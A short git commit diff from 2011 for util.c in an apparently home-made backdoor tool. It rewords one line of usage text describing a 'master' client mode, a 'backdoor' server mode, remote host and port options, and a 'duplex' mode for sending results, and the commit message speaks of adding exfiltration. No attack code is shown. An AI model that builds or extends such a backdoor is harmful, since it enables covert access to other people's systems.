fdb87f5879f0128712c7663f6326f76ec40bf75d
Steve <kythyx@gmail.com>
2011-11-26 17:18:25 -0800

    starting to add exfil stuff

--- util.c
+++ util.c
@@ -16,7 +16,7 @@ void usage(char *name)
   printf(" -c Use client mode: Act as master.\n");
   printf(" -s Use server mode: Act as backdoor. [default]\n");
 	printf(" -i <arg> Remote host address for client mode. [default=127.0.0.1]\n");
-	printf(" -p <arg> Remote port for client mode. [default=9001]\n");
+	printf(" -p <arg> Remote port to use. [default=9001]\n");
 	printf(" -d Use duplex mode: Send/get results remotely.\n");
 	printf(" -h Show this help listing.\n");
   printf(" EXAMPLES:\t %s -c -i 192.168.0.1 -p 80 -d\n", name);
